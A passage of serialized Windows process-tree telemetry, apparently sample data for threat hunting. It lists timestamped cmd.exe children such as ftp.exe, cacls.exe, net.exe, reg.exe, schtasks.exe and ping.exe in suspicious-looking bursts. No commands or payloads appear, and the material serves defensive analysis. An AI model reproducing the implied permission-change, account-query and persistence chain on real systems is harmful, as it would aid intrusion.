23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\net.exe0x1ec2020-07-07 23:07:33.103000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\net.exe0x27042020-07-07 23:07:33.297000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\net.exe0x248c2020-07-07 23:07:33.427000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\net.exe0xf4c2020-07-07 23:07:33.520000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\net.exe0x15282020-07-07 23:07:33.567000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\net.exe0x26182020-07-07 23:07:33.637000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\net.exe0x27fc2020-07-07 23:07:33.683000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\net.exe0x22942020-07-07 23:07:33.807000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\net.exe0x26802020-07-07 23:07:33.893000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\explorer.exe0x167c1970-01-01 00:00:00.000000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0xf0c2020-07-07 23:07:57.093000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x27542020-07-07 23:07:57.130000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x1e4c2020-07-07 23:07:57.160000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x25d82020-07-07 23:07:57.237000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x22442020-07-07 23:07:57.267000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x5b42020-07-07 23:07:57.307000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x3142020-07-07 23:07:57.340000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x113c2020-07-07 23:07:57.413000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x161c2020-07-07 23:09:37.853000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x1bf02020-07-07 23:09:37.903000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0xac82020-07-07 23:09:37.937000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x11102020-07-07 23:35:12.840000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x11482020-07-07 23:35:12.870000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x26042020-07-07 23:35:12.963000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0xf142020-07-07 23:35:13.033000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x1ef82020-07-07 23:35:13.063000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0xaf02020-07-07 23:35:13.107000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x17542020-07-07 23:35:13.137000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x153c2020-07-07 23:35:13.213000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x13882020-07-07 23:35:13.293000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x1e742020-07-07 23:36:53.333000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x14402020-07-07 23:36:53.383000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\net.exe0x60c2020-07-07 23:36:53.413000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\explorer.exe0x167c1970-01-01 00:00:00.000000\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe0x192c2020-07-07 22:58:42.097000\",\"c:\\\\windows\\\\explorer.exe0x167c1970-01-01 00:00:00.000000\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe0xeb02020-07-07 22:58:08.957000\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe0xeb02020-07-07 22:58:08.957000\"],\"parent_proc_lc\":[\"NaN\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\net.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\system32\\\\cmd.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\windows\\\\explorer.exe\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe\"],\"path\":[\"660\",\"660/100\",\"660/108\",\"660/11\",\"660/11/12\",\"660/11/13\",\"660/110\",\"660/111\",\"660/112\",\"660/112/113\",\"660/112/114\",\"660/112/115\",\"660/112/116\",\"660/112/117\",\"660/112/118\",\"660/112/120\",\"660/112/121\",\"660/112/121/123\",\"660/112/122\",\"660/112/124\",\"660/112/124/125\",\"660/112/126\",\"660/112/126/127\",\"660/112/128\",\"660/112/128/130\",\"660/112/129\",\"660/112/131\",\"660/112/131/132\",\"660/112/133\",\"660/112/133/135\",\"660/112/134\",\"660/112/136\",\"660/112/136/137\",\"660/112/138\",\"660/112/138/139\",\"660/112/140\",\"660/112/140/141\",\"660/112/142\",\"660/112/143\",\"660/112/144\",\"660/145\",\"660/145/146\",\"660/145/148\",\"660/145/149\",\"660/145/150\",\"660/145/151\",\"660/145/152\",\"660/145/153\",\"660/145/154\",\"660/145/154/156\",\"660/145/155\",\"660/145/157\",\"660/145/157/158\",\"660/145/159\",\"660/145/159/160\",\"660/145/161\",\"660/145/162\",\"660/145/162/163\",\"660/145/164\",\"660/145/164/165\",\"660/145/166\",\"660/145/167\",\"660/145/167/168\",\"660/145/169\",\"660/145/169/170\",\"660/145/171\",\"660/145/171/172\",\"660/145/173\",\"660/145/174\",\"660/145/175\",\"660/145/178\",\"660/145/178/179\",\"660/145/180\",\"660/145/180/181\",\"660/145/182\",\"660/145/182/183\",\"660/145/184\",\"660/145/244\",\"660/145/245\",\"660/145/246\",\"660/145/247\",\"660/145/248\",\"660/145/249\",\"660/145/250\",\"660/145/250/252\",\"660/145/251\",\"660/145/253\",\"660/145/253/254\",\"660/145/255\",\"660/145/255/256\",\"660/145/257\",\"660/145/257/259\",\"660/145/258\",\"660/145/260\",\"660/145/260/261\",\"660/145/262\",\"660/145/262/264\",\"660/145/263\",\"660/145/265\",\"660/145/265/266\",\"660/145/267\",\"660/145/267/268\",\"660/145/269\",\"660/145/269/270\",\"660/145/271\",\"660/145/272\",\"660/145/273\",\"660/145/276\",\"660/145/276/277\",\"660/145/278\",\"660/145/278/279\",\"660/145/280\",\"660/145/280/281\",\"660/145/282\",\"660/145/283\",\"660/145/284\",\"660/145/285\",\"660/145/286\",\"660/145/287\",\"660/20\",\"660/20/21\",\"660/6\",\"660/6/7\",\"660/6/9\"],\"proc_key\":[\"c:\\\\windows\\\\explorer.exe0x167c1970-01-01 00:00:00.000000\",\"c:\\\\program files (x86)\\\\notepad++\\\\notepad++.exe0x25b02020-07-07 23:04:23.737000\",\"c:\\\\program files (x86)\\\\notepad++\\\\notepad++.exe0x7502020-07-07 23:06:32.530000\",\"c:\\\\program files\\\\internet explorer\\\\iexplore.exe0x20ec2020-07-07 22:58:27.843000\",\"c:\\\\program files (x86)\\\\internet explorer\\\\iexplore.exe0x4642020-07-07 22:58:27.937000\",\"c:\\\\program files (x86)\\\\internet explorer\\\\iexplore.exe0x13282020-07-07 22:58:28.333000\",\"c:\\\\program files (x86)\\\\notepad++\\\\notepad++.exe0x1d602020-07-07 23:06:48.417000\",\"c:\\\\program files (x86)\\\\notepad++\\\\notepad++.exe0x1de02020-07-07 23:07:20.273000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x26a82020-07-07 23:07:32.387000\",\"c:\\\\windows\\\\system32\\\\conhost.exe0x1ffc2020-07-07 23:07:32.400000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x34c2020-07-07 23:07:32.543000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x1b7c2020-07-07 23:07:32.563000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11842020-07-07 23:07:32.573000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x13d42020-07-07 23:07:32.663000\",\"c:\\\\windows\\\\system32\\\\ftp.exe0x17ec2020-07-07 23:07:32.770000\",\"c:\\\\windows\\\\system32\\\\cacls.exe0x16b42020-07-07 23:07:33.023000\",\"c:\\\\windows\\\\system32\\\\net.exe0x1ec2020-07-07 23:07:33.103000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x1e602020-07-07 23:07:33.253000\",\"c:\\\\windows\\\\system32\\\\findstr.exe0x121c2020-07-07 23:07:33.110000\",\"c:\\\\windows\\\\system32\\\\net.exe0x27042020-07-07 23:07:33.297000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x261c2020-07-07 23:07:33.307000\",\"c:\\\\windows\\\\system32\\\\net.exe0x248c2020-07-07 23:07:33.427000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x14542020-07-07 23:07:33.437000\",\"c:\\\\windows\\\\system32\\\\net.exe0xf4c2020-07-07 23:07:33.520000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x26142020-07-07 23:07:33.530000\",\"c:\\\\windows\\\\system32\\\\findstr.exe0x6c2020-07-07 23:07:33.523000\",\"c:\\\\windows\\\\system32\\\\net.exe0x15282020-07-07 23:07:33.567000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x1d982020-07-07 23:07:33.577000\",\"c:\\\\windows\\\\system32\\\\net.exe0x26182020-07-07 23:07:33.637000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x24982020-07-07 23:07:33.653000\",\"c:\\\\windows\\\\system32\\\\findstr.exe0x10582020-07-07 23:07:33.647000\",\"c:\\\\windows\\\\system32\\\\net.exe0x27fc2020-07-07 23:07:33.683000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x27ec2020-07-07 23:07:33.697000\",\"c:\\\\windows\\\\system32\\\\net.exe0x22942020-07-07 23:07:33.807000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x19dc2020-07-07 23:07:33.820000\",\"c:\\\\windows\\\\system32\\\\net.exe0x26802020-07-07 23:07:33.893000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x18bc2020-07-07 23:07:33.907000\",\"c:\\\\windows\\\\system32\\\\reg.exe0xebc2020-07-07 23:07:34.003000\",\"c:\\\\windows\\\\system32\\\\schtasks.exe0x126c2020-07-07 23:07:34.090000\",\"c:\\\\windows\\\\system32\\\\ping.exe0x1fb02020-07-07 23:07:34.190000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x11e02020-07-07 23:07:41.087000\",\"c:\\\\windows\\\\system32\\\\conhost.exe0x13e82020-07-07 23:07:41.130000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x27c42020-07-07 23:07:56.797000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x18942020-07-07 23:07:56.820000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x2f82020-07-07 23:07:56.837000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x18502020-07-07 23:07:56.887000\",\"c:\\\\windows\\\\system32\\\\ftp.exe0x12802020-07-07 23:07:56.907000\",\"c:\\\\windows\\\\system32\\\\cacls.exe0x27902020-07-07 23:07:57.077000\",\"c:\\\\windows\\\\system32\\\\net.exe0xf0c2020-07-07 23:07:57.093000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x1a0c2020-07-07 23:07:57.103000\",\"c:\\\\windows\\\\system32\\\\findstr.exe0x176c2020-07-07 23:07:57.100000\",\"c:\\\\windows\\\\system32\\\\net.exe0x27542020-07-07 23:07:57.130000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x265c2020-07-07 23:07:57.137000\",\"c:\\\\windows\\\\system32\\\\net.exe0x1e4c2020-07-07 23:07:57.160000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x24502020-07-07 23:07:57.170000\",\"c:\\\\windows\\\\system32\\\\findstr.exe0x19d02020-07-07 23:07:57.237000\",\"c:\\\\windows\\\\system32\\\\net.exe0x25d82020-07-07 23:07:57.237000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x4742020-07-07 23:07:57.247000\",\"c:\\\\windows\\\\system32\\\\net.exe0x22442020-07-07 23:07:57.267000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x7f42020-07-07 23:07:57.280000\",\"c:\\\\windows\\\\system32\\\\findstr.exe0x20442020-07-07 23:07:57.307000\",\"c:\\\\windows\\\\system32\\\\net.exe0x5b42020-07-07 23:07:57.307000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x1c082020-07-07 23:07:57.317000\",\"c:\\\\windows\\\\system32\\\\net.exe0x3142020-07-07 23:07:57.340000\",\"c:\\\\windows\\\\system32\\\\net1.exe0xbac2020-07-07 23:07:57.350000\",\"c:\\\\windows\\\\system32\\\\net.exe0x113c2020-07-07 23:07:57.413000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x27e82020-07-07 23:07:57.420000\",\"c:\\\\windows\\\\system32\\\\reg.exe0x7e02020-07-07 23:07:57.470000\",\"c:\\\\windows\\\\system32\\\\schtasks.exe0x25142020-07-07 23:07:57.487000\",\"c:\\\\windows\\\\system32\\\\ping.exe0xf682020-07-07 23:07:57.513000\",\"c:\\\\windows\\\\system32\\\\net.exe0x161c2020-07-07 23:09:37.853000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x1c642020-07-07 23:09:37.863000\",\"c:\\\\windows\\\\system32\\\\net.exe0x1bf02020-07-07 23:09:37.903000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x3c2020-07-07 23:09:37.910000\",\"c:\\\\windows\\\\system32\\\\net.exe0xac82020-07-07 23:09:37.937000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x26982020-07-07 23:09:37.943000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x20c42020-07-07 23:09:37.963000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x402020-07-07 23:35:12.570000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x271c2020-07-07 23:35:12.590000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x1ab42020-07-07 23:35:12.603000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x16382020-07-07 23:35:12.640000\",\"c:\\\\windows\\\\system32\\\\ftp.exe0x13a82020-07-07 23:35:12.660000\",\"c:\\\\windows\\\\system32\\\\cacls.exe0x10a42020-07-07 23:35:12.823000\",\"c:\\\\windows\\\\system32\\\\net.exe0x11102020-07-07 23:35:12.840000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x20dc2020-07-07 23:35:12.850000\",\"c:\\\\windows\\\\system32\\\\findstr.exe0xaa42020-07-07 23:35:12.843000\",\"c:\\\\windows\\\\system32\\\\net.exe0x11482020-07-07 23:35:12.870000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x6602020-07-07 23:35:12.880000\",\"c:\\\\windows\\\\system32\\\\net.exe0x26042020-07-07 23:35:12.963000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x26642020-07-07 23:35:12.973000\",\"c:\\\\windows\\\\system32\\\\net.exe0xf142020-07-07 23:35:13.033000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x11082020-07-07 23:35:13.043000\",\"c:\\\\windows\\\\system32\\\\findstr.exe0x178c2020-07-07 23:35:13.037000\",\"c:\\\\windows\\\\system32\\\\net.exe0x1ef82020-07-07 23:35:13.063000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x24a82020-07-07 23:35:13.073000\",\"c:\\\\windows\\\\system32\\\\net.exe0xaf02020-07-07 23:35:13.107000\",\"c:\\\\windows\\\\system32\\\\net1.exe0xa242020-07-07 23:35:13.117000\",\"c:\\\\windows\\\\system32\\\\findstr.exe0x1b042020-07-07 23:35:13.110000\",\"c:\\\\windows\\\\system32\\\\net.exe0x17542020-07-07 23:35:13.137000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x25a82020-07-07 23:35:13.143000\",\"c:\\\\windows\\\\system32\\\\net.exe0x153c2020-07-07 23:35:13.213000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x13b02020-07-07 23:35:13.223000\",\"c:\\\\windows\\\\system32\\\\net.exe0x13882020-07-07 23:35:13.293000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x24c02020-07-07 23:35:13.303000\",\"c:\\\\windows\\\\system32\\\\reg.exe0x19602020-07-07 23:35:13.340000\",\"c:\\\\windows\\\\system32\\\\schtasks.exe0x219c2020-07-07 23:35:13.357000\",\"c:\\\\windows\\\\system32\\\\ping.exe0x1bf42020-07-07 23:35:13.380000\",\"c:\\\\windows\\\\system32\\\\net.exe0x1e742020-07-07 23:36:53.333000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x13e02020-07-07 23:36:53.343000\",\"c:\\\\windows\\\\system32\\\\net.exe0x14402020-07-07 23:36:53.383000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x1fd02020-07-07 23:36:53.390000\",\"c:\\\\windows\\\\system32\\\\net.exe0x60c2020-07-07 23:36:53.413000\",\"c:\\\\windows\\\\system32\\\\net1.exe0x26702020-07-07 23:36:53.420000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x5e02020-07-07 23:36:53.443000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x1e782020-07-07 23:37:07.953000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0xe3c2020-07-07 23:37:07.973000\",\"c:\\\\windows\\\\system32\\\\cmd.exe0x22142020-07-07 